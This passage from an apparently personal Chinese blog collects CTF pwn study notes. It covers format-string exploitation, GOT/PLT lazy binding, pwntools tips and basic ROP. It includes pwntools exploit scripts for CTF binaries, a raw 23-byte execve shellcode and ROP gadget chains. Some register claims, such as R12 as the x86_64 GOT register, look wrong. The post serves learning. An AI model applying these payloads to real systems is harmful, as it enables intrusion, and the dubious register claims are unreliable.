10$是指往第十个参数（即printf的第十一个参数，格式化字符串的地址是printf的第一个参数）填入数据，pwnme的地址加上&#x27;aaaa&#x27;刚好八个字节</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">b&#x27;jack&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;please:&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>补：如何看是第几个参数？<br>gdb中利用x命令来看<br>x&#x2F;20wx $esp<br>意为查看从esp开始的20个字长的内容（以16进制显示）</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-23%20232153.png" alt="a"></p><p>其中0x61616161 为我们先前利用fgets输入的aaaa,根据它和esp间隔的距离（字长数）来判断，图中esp（即为0xffffcff0）与0x61616161 相距10个字长（从左往右数，0xffffd018为0xffffcff0存储的内容，类推），所以填%10$n。</p><h3 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h3><p>payload还有一种写法，即利用pwntools的fmtstr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804A068</span>:<span class="number">8</span>&#125;)</span><br></pre></td></tr></table></figure><p>10就是和esp间隔的距离（字长数），0x0804A068为需利用%n修改的地址，8为目标数值</p><h2 id="64位格式化字符串漏洞"><a href="#64位格式化字符串漏洞" class="headerlink" title="64位格式化字符串漏洞"></a>64位格式化字符串漏洞</h2><p>例题：【2017 UIUCTF  pwn200 GoodLuck】<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a></p><p>漏洞很明显<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20120130.png" alt="1"></p><p>我们先将断点打在printf上，随便输个数据看看情况<br>先看寄存器，格式化字符串存放在rdi寄存器上<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20115014.png" alt="1"><br>然后再看栈<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20114933.png" alt="1"><br>可以看到flag放在0x7fffffffde80的地方(打的本地，自己写的flag)，栈顶存放printf的返回地址，flag对应栈上的偏移为4（往下数第四行就有），加上寄存器的5（一共有6个来放参数嘛，rdi是第一个），所以总偏移是9<br>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./goodluck&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%9$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><p>例题：【三个白帽 - pwnme_k0】<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0</a></p><p>发现relro全开，got表只读<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20155925.png" alt="11"></p><p>ida查看，发现格式化字符串漏洞<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160116.png" alt="1"><br>而且有后门函数，考虑利用printf修改retaddress，跳转到后门函数<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160044.png" alt="1"><br>ret的地址通过old rbp的地址减去偏移量来得出，old rbp的地址通过printf泄露</p><p>gdb  断点下在printf函数，不难看出rbp偏移为6 ,ret的偏移为7<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-26%20160543.png" alt="q"><br><em>为什么是old rbp？ 因为rbp保存的是old rbp的地址，%p取出的是rbp的内容，即old rbp的地址</em><br>计算得old rbp与ret的偏移为0x38 （ 0x7fffffffddf0-0x7fffffffddb8）</p><p>我们发现ret上存储的地址为0x400d74，与binsh的地址0x04008AA只有后三位不同，所以我们只用%hn修改两个字节<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io=process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;%6$p&quot;</span>)<span class="comment">#打印old rbp,这边用send的话是打不通的，因为少了一个\n的话下面的io.recvline()会将rbp地址和后面的文字合并在一起，导致ret_addr多了不必要的东西</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>) </span><br><span class="line">ret_addr= <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>) - <span class="number">0x38</span></span><br><span class="line">success(<span class="string">&quot;ret_addr:&quot;</span>+<span class="built_in">hex</span>(ret_addr))  <span class="comment">#泄露成功就会给出old rbp地址</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.send(p64(ret_addr))</span><br><span class="line">io.send(<span class="string">b&quot;%2218d%8$hn&quot;</span>) <span class="comment">#2218是0x8aa的十进制形式</span></span><br><span class="line">io.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定机制+got表plt表</title>
      <link href="/2024/03/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6+got%E8%A1%A8plt%E8%A1%A8/"/>
      <url>/2024/03/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6+got%E8%A1%A8plt%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><em><strong>转载，原文作者：</strong></em> <strong>载酒</strong></p><p><em>附址：<a href="https://github.com/ctfer-zaijiu?tab=stars">https://github.com/ctfer-zaijiu?tab=stars</a></em></p><p><em>仅供个人学习参考</em>  </p><span id="more"></span><h1 id="延迟绑定机制-got表plt表"><a href="#延迟绑定机制-got表plt表" class="headerlink" title="延迟绑定机制+got表plt表"></a>延迟绑定机制+got表plt表</h1><blockquote><p>也不必说，鸣蝉在树叶里长吟，肥胖的黄蜂伏在菜花上 🌾</p></blockquote><h1 id="plt表和-got-plt表"><a href="#plt表和-got-plt表" class="headerlink" title=".plt表和.got.plt表"></a>.plt表和.got.plt表</h1><p><strong>【定义】</strong> </p><p>got表思想就是设计一个got表用来存放所有全局符号地址，早在静态链接的设计中就有，其中实现上被实现为了以下两个表：</p><p>1、<code>.got</code>存放全局变量引用地址</p><p>2、<code>.got.plt</code>存放函数引用地址</p><p>为了实现延迟绑定机制，才在got表的基础上接入了plt表，其加入有2 个设计目标：</p><p>1、实现第一次调用函数时会做重定位，而后第二次之后的所有函数调用就都是直接调用</p><p>2、实现传参并调用_dl_runtime_resolve()</p><p>这两个表被ld.so也就是动态链接器所维护，主要是：在ld.so里定义了一个_dl_runtime_resolve函数用来进行重定位+符号地址解析，并将结果更新在plt、got表中。</p><p><strong>【结构】</strong></p><p>plt表存储指令，got表存储指令要用到的 数据。他们都是：可复用的东西放表头，某函数独有的东西做表项。</p><ul><li><p><strong>plt表的结构如下：</strong></p><ul><li><p>表头是调用runtime_resorve函数的指令，每个函数在第一次用runtime_resorve函数进行“符号地址解析”时就对该段指令进行复用。</p></li><li><p>每个表项是以下三条指令：</p><p>  1、jmp,用来跳到函数处，使用的地址存在got表表项。如果成功就直接调到函数，如果失败（符号地址未被解析）就跳到接下来的指令“2”“3”</p><p>  2、push,用来给runtime_resorve函数传参，数据用立即数</p><p>  3、jmp,跳回plt表头</p></li></ul></li><li><p><strong>got表的结构如下：</strong></p><ul><li>表头是三个特殊地址，是每个函数进行重定位时可以复用的调用runtime_resolve函数的数据，其中：<ul><li>got[0]是.dymanic段的基址</li><li>got[1]是一个指向linkmap结构体实现的指针，该结构体实现位于栈上</li><li>got[2]是_dl_runtime_resolve函数的地址</li></ul></li><li>每个表项都是一个地址指针，被重定位前指向plt表的对应字段的第二句指令开始处，被重定位后指向对应函数地址处</li></ul></li></ul><p><strong>总体结构如下图↓：</strong></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreihsuwn4yezxio5buc27wd6ncxz7atafjz44lrxgjw233qhqafi7vi" alt="Untitled"></p><p><strong>【位置】</strong></p><p>这两个表是每个程序私有的，而不是可以多个程序之间共享的。</p><p>也就是说，在不开ASLR的情况下，每一次运行elf程序时got表、plt表的基址的后12位是一样的！</p><p>“got”表基址通常存放在特定的寄存器中，以便在程序执行时快速访问。具体来说，常见的做法是将”got”表基址存放在全局偏移表寄存器（Global Offset Table Register，通常简称为GOT寄存器）中。</p><p>GOT寄存器的命名和具体寄存器编号会根据不同的体系结构和操作系统而有所不同。以下是一些常见架构和操作系统中使用的GOT寄存器示例：</p><p>x86架构（32位）：</p><ul><li>在x86架构的Linux系统中，GOT寄存器通常是EBX（32位寄存器）。</li></ul><p>x86架构（64位）：</p><ul><li>在x86架构的Linux系统中，GOT寄存器通常是R12（64位寄存器）。</li></ul><p>ARM架构：</p><ul><li>在ARM架构中，GOT寄存器通常是R9（ARMv7架构）或X19（ARMv8架构）。</li></ul><p>MIPS架构：</p><ul><li>在MIPS架构中，GOT寄存器通常是GP（全局指针寄存器）。<br>需要注意的是，具体的寄存器使用可能会受到编译器、操作系统和编译选项的影响。因此，对于特定的平台和环境，可能会有一些变化。</li></ul><p><strong>【相关操作】</strong></p><p>可以通过pwntools的以下指令来获得这两个表中某个函数的地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./pwntest&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以通过objdump来查看一个elf的got表plt表中共有哪些函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看文件的got表</span></span><br><span class="line">$ objdump -R pwn3</span><br><span class="line"><span class="comment">#查看文件的plt表</span></span><br><span class="line">$ objdump -dj .plt migration </span><br></pre></td></tr></table></figure><h1 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h1><p><strong>【定义】</strong></p><p>又叫lazybinding，其通过got表和plt表的联动，实现：</p><p>第一次访问plt表时会执行run_time_resolve，第二次及以后访问plt表时就会自动跳转到函数代码，如图↓：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiajnqsybm34don75dcab7qqc3dlpvbzota5et6yjwyci62yagx7lu" alt="Untitled"></p><p>当函数第一次用到时才进行重定位获取位置，这样会大大提高程序启动速度</p><p><strong>【实现过程】</strong></p><p>第一次执行该对该func的call时的指令执行流程：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreigprlkufrc5h7mnh4vtgmaxfi4dfvc54xu4vkubnbplzlf5sry4ni" alt="执行完dl_runtime_resolve函数完成重定位后会返回call语句的前一句语句位置，然后再执行第2次对该func的call"></p><p>执行完dl_runtime_resolve函数完成重定位后会返回call语句的前一句语句位置，然后再执行第2次对该func的call</p><p>重定位完成后，第2、3、4…次执行对该func的call时的指令执行流程：</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreicmjb5ifjomdh4pmcdvlrjwo5hm7d3uowx3ab3c7vurh4dhscxyx4" alt="Untitled"></p><h1 id="不使用延迟绑定"><a href="#不使用延迟绑定" class="headerlink" title="不使用延迟绑定"></a>不使用延迟绑定</h1><p>1、在一些情况下，一个 GCC 编译的程序可能不会有 PLT 表。这通常是因为编译器或链接器在某些情况下会进行优化，例如，如果程序中没有对动态链接库函数的显式调用或者只有很少的动态链接库函数，那么编译器或链接器可能会选择不生成 PLT 表。</p><p>2、在linux系统中使用使用FullRelro安全策略时，默认直接装载时全部重定位，此时也不会有plt表而只会有got表</p><p>3、弱符号引用：当程序使用弱符号引用时，通常也不会使用延迟绑定。弱符号是一种特殊类型的符号引用，（举个栗子：在c&#x2F;c++语言中，编译器默认函数和已经初始化的全局变量为强符号，未初始化的全局变量为弱符号）其绑定是可选的（即弱引用），如果找不到符号的定义，程序可以继续执行（默认值为0或别的特殊值）。在这种情况下，通常会在程序启动时立即解析和绑定弱符号引用，以便在需要时进行正确的调用或访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tips</title>
      <link href="/2024/03/20/Tips/"/>
      <url>/2024/03/20/Tips/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="number">0xa</span> //直接输入十六进制数，然后回车</span><br></pre></td></tr></table></figure><h3 id="十六进制转字符"><a href="#十六进制转字符" class="headerlink" title="十六进制转字符"></a>十六进制转字符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="built_in">chr</span>(<span class="number">0x41</span>) //输出为<span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="打印某函数的got表地址"><a href="#打印某函数的got表地址" class="headerlink" title="打印某函数的got表地址"></a>打印某函数的got表地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line">elf.got[<span class="string">&#x27;function&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="打包成字符串并发送"><a href="#打包成字符串并发送" class="headerlink" title="打包成字符串并发送"></a>打包成字符串并发送</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="built_in">str</span>(data))</span><br></pre></td></tr></table></figure><hr><p>p32&#x2F;p64: 打包一个整数，分别打包为32位或64位<br>u32&#x2F;u64:解包一个字符串，得到整数</p><h3 id="关于p64（p32）"><a href="#关于p64（p32）" class="headerlink" title="关于p64（p32）"></a>关于p64（p32）</h3><p>&emsp;&emsp;在使用 p64 函数或者其他打包函数时，确保该函数是一个<strong>整数</strong>，而不是字节串或者其他非整数类型的数据。<br>&emsp;&emsp;如果该函数是以字节串形式表示的十六进制地址（如 b’0x7ffc52917000’），需要先将其转换为整数再进行处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 buf 是一个字节串表示的十六进制地址</span></span><br><span class="line">buf_bytes = <span class="string">b&#x27;0x7ffc52917000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节串表示的十六进制地址转换为整数</span></span><br><span class="line">buf_int = <span class="built_in">int</span>(buf_bytes, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用p64打包函数</span></span><br><span class="line">p64(buf_int)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="发送和接受数据"><a href="#发送和接受数据" class="headerlink" title="发送和接受数据"></a>发送和接受数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">conn.send(data) <span class="comment">#发送数据</span></span><br><span class="line">conn.sendline(data) <span class="comment">#发送一行数据，相当于在数据后面加\n</span></span><br><span class="line"><span class="comment">#接收数据，numb制定接收的字节，timeout指定超时</span></span><br><span class="line">conn.recv(numb = <span class="number">2048</span>, timeout = default)</span><br><span class="line"><span class="comment">#接受一行数据，keepends为是否保留行尾的\n</span></span><br><span class="line">conn.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#接受数据直到我们设置的标志出现</span></span><br><span class="line">conn.recvuntil(<span class="string">&quot;Hello,World\n&quot;</span>,drop=fasle) <span class="comment">##drop=true 时接受的数据会去除引号内的内容，返回的数据为字符串类型</span></span><br><span class="line"><span class="comment">##若要做计算，需转为如int 类型</span></span><br><span class="line"><span class="built_in">int</span>(conn.recv(),<span class="number">16</span>) <span class="comment">## 16意为16进制</span></span><br><span class="line">conn.recvall()  <span class="comment">#一直接收直到 EOF</span></span><br><span class="line">conn.recvrepeat(timeout = default)  <span class="comment">#持续接受直到EOF或timeout</span></span><br><span class="line"><span class="comment">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="comment">## 在Python 3中，print是一个函数，而不再是一个语句，所以正确的语法是使用括号将要打印的内容括起来</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.address))  <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># 函数地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># GOT表的地址</span></span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">hex</span>(e.plt[<span class="string">&#x27;write&#x27;</span>])) <span class="comment"># PLT的地址</span></span><br><span class="line"><span class="number">0x401680</span></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>*选中伪代码，右键可将其复制到汇编代码中</p><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>b main的时候gdb查找不到函数的，是因为main函数被删符号表，体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数</p><h2 id="syscall和函数传参"><a href="#syscall和函数传参" class="headerlink" title="syscall和函数传参"></a>syscall和函数传参</h2><p>*x86<br>    返回值：eax<br>    syscall：int 0x80<br>    syscall调用号：eax<br>    syscall参数：ebx ecx edx esi edi ebp<br>    函数参数：stack<br>*x86_64<br>    返回值：rax<br>    syscall：syscall<br>    syscall调用号：rax<br>    syscall参数：rdi rsi rdx r10 r8 r9<br>    函数参数：rdi rsi rdx rcx r8 r9 stack<br>*arm32(aarch32)<br>    返回值 : r7<br>    syscall : svc 0<br>    syscall调用号: r7<br>    syscall参数: r0 , r1 , r2 , r3 , stack<br>    函数参数: r0 , r1 , r2 , r3 , stack<br>*arm64(aarch64)<br>    返回值 : x0<br>    syscall : svc 0<br>    syscall调用号: x8<br>    syscall参数: x0 , x1 , x2 , x3 , x4 , x5<br>    函数参数: x0 , x1 , x2 , x3 , x4 , x5 , x6 , x7 , stack</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本ROP</title>
      <link href="/2024/03/19/%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2024/03/19/%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><em>有后门就是爽</em></p><p>&emsp;&emsp;先checksec一下<br><img src="https://gateway.pinata.cloud/ipfs/bafkreidinxxhoal5le2ostrvnsk2e642q6igikurfyqknvipghipusys3e" alt="checksec"><br>开启了nx保护和部分relro<br>用ida查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreidgjsu6uimvkdto3w7llwdyq55cvztg7hds5nbkwtzpq6qakvrth4" alt="ida"><br>明显有个栈溢出，且存在后门函数<br>&emsp;&emsp;基本思路：我们只需往变量s里填充垃圾数据，覆盖到ebp，再加入后门函数的地址，就可以获得shell。<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">backdoor=<span class="number">0x0804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>)+p32(backdoor)</span><br><span class="line">io=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，多填充4字节的垃圾数据是为了覆盖ebp of previous stack frame，即父函数的栈帧的基指针（通常使用ebp寄存器来保存）</p><hr><p><em>补充：当一个函数被调用时，它会在栈上创建一个新的栈帧，用于存储函数的局部变量、参数和其他上下文信息。在创建新栈帧时，当前函数会将其<u>前一个栈帧的基指针值</u>保存在 ebp 寄存器中，以便后续操作可以访问前一个栈帧。</em><br><img src="https://gateway.pinata.cloud/ipfs/bafkreig6qvp33bybtjezfhlrbvwdhfnsdy5phercnxvsagclda6n4fhkfe" alt="函数调用栈示意图"></p><hr><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p><em>没有system（“&#x2F;bin&#x2F;sh”）就创造一个出来！！</em></p><p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreih2w64dundco6wy4eltsf6eqlhc7dvwoziuiftnwe2wm2aaoss2vy" alt="1"><br>发现有可读可写可执行段<br>打开ida<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiha54ne2p5u7vjd2f6tdnmty5marlcqv4uar3muz4nwlnxxo4a5oq" alt="2"><br>&emsp;&emsp;有栈溢出，并且将s的数据拷贝到buf上，因为栈不可执行，所以我们可以把后门函数写入到buf上（buf位于.bss段），然后再通过栈溢出返回到buf，即可获得shell<br><em>emm似乎因为某些未知原因该题在我机子上显示.bss段不可执行，所以打不通，但是思路是没有问题的</em><br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">io.sendline(shellcode.ljust((<span class="number">0xffffd148</span>-<span class="number">0xffffd0dc</span>+<span class="number">4</span>),<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>若文件是64位的，需要加个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure><p>题目可输入的字长不够时，可以试试这个shellcode，只有23字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode：<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><em>简单的一次代码碎片利用</em><br><em>“震惊！！小小碎片竟然能够……”</em></p><p>查看文件<br><img src="https://gateway.pinata.cloud/ipfs/bafkreihl4i3gaqkwx2z4spiu3lrtpx2btts3k7dhqzh7as5ymswb4krwue" alt="1"><br>开启了nx保护<br>再用ida看看<br><img src="https://gateway.pinata.cloud/ipfs/bafkreibbq5j2yegjl7gu4xxy4pcmg73w67ygpffvyd4b4ltg2yk73qh3wq" alt="2"><br>存在栈溢出，且有字符串“&#x2F;bin&#x2F;sh”，但是经过查找发现有可利用的代码片段，于是采用rop的思路，通过系统调用获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>利用这个系统调用，其系统调用号为<strong>0xb</strong>，elf的中断指令为<strong>int 0x80</strong><br>存放思路:<br>    eax  0xb<br>    ebx  binsh地址（0x080BE408）<br>    ecx 0<br>    edx 0<br>利用ROPgadget工具查找相应指令，如下：<br><img src="https://gateway.pinata.cloud/ipfs/bafkreifwgzhd46sjutyvoltbguv2cpvtktncqtgzxntar7owtio5jxvs4i" alt="ROPgadget"><br><img src="https://gateway.pinata.cloud/ipfs/bafybeifa62urkqgff7cxafghfy2kzm6r5ingclc2fx7ak4er2xo3qa7pye" alt="2"><br>找到俩能用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 